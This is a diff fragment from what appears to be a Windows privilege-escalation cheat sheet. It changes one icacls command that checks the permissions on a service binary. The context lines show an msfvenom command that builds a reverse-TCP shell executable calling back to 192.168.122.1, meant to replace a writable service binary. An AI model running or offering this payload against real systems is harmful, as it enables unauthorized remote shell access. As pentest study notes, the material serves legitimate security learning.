@@ -197,7 +197,7 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 
 🔺Check configuration of binary
 🔺(F) = Full control
-icacls.exe .\simpleService.exe
+icacls scheduler.exe
 
 🔺If we have (F), we can override it
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
